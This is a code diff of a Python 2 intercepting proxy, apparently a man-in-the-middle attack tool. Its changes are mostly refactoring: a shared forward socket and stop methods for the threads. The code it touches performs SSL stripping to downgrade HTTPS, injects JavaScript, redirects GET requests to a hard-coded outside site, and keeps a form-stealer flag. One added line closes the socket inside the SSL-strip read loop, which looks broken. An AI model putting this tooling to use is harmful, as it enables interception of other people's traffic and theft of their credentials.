@@ -1,21 +1,24 @@
 import socket
 import sys
 import ssl
-from threading import Thread
+import threading
 from JSInjector import JSInjector
 from Redirecter import Redirecter
 
 DATASIZE = 8192
 
 
-class Client(Thread):
+class Client(threading.Thread):
     def __init__(self, csocket, config, tools):
-        Thread.__init__(self)
+        threading.Thread.__init__(self)
         self._csocket = csocket
+        self._fsocket = None
         self._config = config
         self._tools = tools
         self._js = JSInjector()
         self._redirecter = Redirecter()
+        self.isRunning = True
+        self._stop = threading.Event()
         self._redirectto = 0
         self._redirectown = 0
         self._formstealer = 0
@@ -40,18 +43,25 @@ class Client(Thread):
         else:
             self.httpProxy(request, hostname)
 
-        self._csocket.close()
+        #self._csocket.close()
+
+    def stop(self):
+        self.isRunning = False
+        self._stop.set()
+        if self._fsocket:
+            self._fsocket.close()
+        self._csocket.shutdown(socket.SHUT_RDWR)
 
     def sslProxy(self, request, hostname):
-        fsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self._fsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
         try:
-            fsocket.connect((hostname, 443))
+            self._fsocket.connect((hostname, 443))
         except socket.error as msg:
             print msg
             return
 
-        SSLThread = SSLServer(fsocket, self._csocket, 443)
+        SSLThread = SSLServer(self._fsocket, self._csocket, 443)
         SSLThread.start()
 
         http_ok = "HTTP/1.1 200 OK\r\n\r\n"
@@ -61,19 +71,22 @@ class Client(Thread):
         except socket.error as msg:
             print msg
 
-        while True:
+        while self.isRunning:
             resp = self._csocket.recv(DATASIZE)
             if not resp:
                 break
 
             try:
-                fsocket.sendall(bytes(resp))
+                self._fsocket.sendall(bytes(resp))
             except socket.error as msg:
                 print msg
                 break
 
+        if not self.isRunning:
+            SSLThread.stop()
         SSLThread.join()
-        fsocket.close()
+
+        self._fsocket.close()
 
     def httpProxy(self, request, hostname):
 
@@ -84,21 +97,21 @@ class Client(Thread):
         # Features - Uses features which are enabled in the config file
         request = self.FeatureSetup(self._config, request)
 
-        fsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self._fsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
         try:
-            fsocket.connect((hostname, 80))
+            self._fsocket.connect((hostname, 80))
         except socket.error as msg:
             print msg
             return
 
         # Send request from client to target server
-        fsocket.sendall(request)
+        self._fsocket.sendall(request)
 
         response = ""
 
-        while True:
-            resp = fsocket.recv(DATASIZE)
+        while self.isRunning:
+            resp = self._fsocket.recv(DATASIZE)
             response += resp
             if not resp:
                 break
@@ -116,7 +129,7 @@ class Client(Thread):
             if "GET " in header:
                 status = self._redirecter.redirectToURL("http://scizoo.lima-city.de/", self._csocket, header)
                 if status is True:
-                    fsocket.close()
+                    self._fsocket.close()
                     return
 
         """ ++++++++++++++++++++++++++++ Redirecter - Display own Page ++++++++++++++++++++++++++++ """
@@ -132,7 +145,7 @@ class Client(Thread):
         except socket.error as msg:
             print msg
 
-        fsocket.close()
+        self._fsocket.close()
 
     def sslStrip(self, request, hostname):
         if "CONNECT" in self._tools.getFirstLine(request):
@@ -152,26 +165,26 @@ class Client(Thread):
         if "Proxy-Connection: Keep-Alive" in request:
             request = request.replace("Proxy-Connection: Keep-Alive", "Proxy-Connection: Close")
 
-        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_sock.settimeout(10)
+        self._fsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self._fsocket.settimeout(10)
 
         if oldreq is not request:
             print "[+] SSL strip successful!"
             port = 443
-            server_sock = ssl.wrap_socket(server_sock)
-            server_sock.connect((hostname, port))
-            server_sock.send(request)
+            self._fsocket = ssl.wrap_socket(self._fsocket)
+            self._fsocket.connect((hostname, port))
+            self._fsocket.send(request)
             isSSL = True
         else:
-            server_sock.connect((hostname, 80))
-            server_sock.sendall(request)
+            self._fsocket.connect((hostname, 80))
+            self._fsocket.sendall(request)
 
         req = ""
-        while True:
+        while self.isRunning:
             if isSSL:
-                response = server_sock.read()
+                response = self._fsocket.read()
             else:
-                response = server_sock.recv(DATASIZE)
+                response = self._fsocket.recv(DATASIZE)
 
             if not response or response == "stop":
                 break
@@ -190,6 +203,7 @@ class Client(Thread):
                 break
 
             req += response
+            self._fsocket.close()
 
     def FeatureSetup(self, config, request):
         try:
@@ -231,12 +245,14 @@ class Client(Thread):
             sys.exit(-1)
 
 
-class SSLServer(Thread):
+class SSLServer(threading.Thread):
     def __init__(self, ssocket, csocket, port):
-        Thread.__init__(self)
+        threading.Thread.__init__(self)
         self._ssocket = ssocket
         self._csocket = csocket
+        self._stop = threading.Event()
         self._port = port
+        self.isRunning = True
 
     def run(self):
         response = ""
@@ -254,3 +270,12 @@ class SSLServer(Thread):
             except socket.error as msg:
                 print msg
                 break
+
+    def stop(self):
+        self.isRunning = False
+        self._stop.set()
+        if self._ssocket:
+            self._ssocket.close()
+
+        if self._csocket:
+            self._csocket.shutdown(socket.SHUT_RDWR)
